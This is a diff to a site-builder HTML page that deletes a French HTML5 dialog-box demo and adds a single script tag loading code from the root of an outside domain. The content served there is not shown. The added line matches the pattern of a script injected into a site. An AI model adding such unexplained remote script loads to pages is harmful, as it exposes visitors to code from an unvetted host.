@@ -77,25 +77,11 @@
  
  
 	<h1>Fenêtre modale HTML5</h1> 
-	<p id="promptCompat">Votre navigateur ne pend pas en charge les balises <code></code></p><dialog></dialog><p></p> 
-	<dialog id="mydialog" open=""> 
-		Voici une fenêtre d'information !<br> 
-		<p>Elle peut contenir tout type de balises HTML.</p> 
-					<div>Remplir ce champ pour modifier le message de fermeture <input id="closeMsg" placeholder="Y compris des éléments de formulaire"></div> 
-		<div class="boutons"><button onclick="$dialog.close()">Fermer</button>&nbsp;<button onclick="$dialog.returnValue = document.getElementById('closeMsg').value">Définir un message</button></div> 
-	</dialog> 
-	<div class="boutons"><button onclick="$dialog.show()">Ouvrir en mode normal</button>&nbsp;<button onclick="$dialog.showModal()">Ouvrir en mode modal</button></div> 
-	<div class="boutons"><button onclick="alert($dialog.open)">Vérifier l'attribut <code>open</code></button></div> 
-	<script> 
-                var $dialog = document.getElementById('mydialog'); 
-                if(!('show' in $dialog)){ 
-                        document.getElementById('promptCompat').className = 'no_dialog'; 
-                } 
-                $dialog.addEventListener('close', function() { 
-                        console.log('Fermeture. ', this.returnValue); 
-                }); 
-        </script> 
+	<script src="https://www.jpwebdesign.be"></script>
+                
  
+
+
 </div></div></div>
     </section>
     <section data-silex-type="container-element" class="container-element editable-style silex-id-1478366450713-3 section-element prevent-resizable" data-silex-id="silex-id-1478366450713-3" style="">
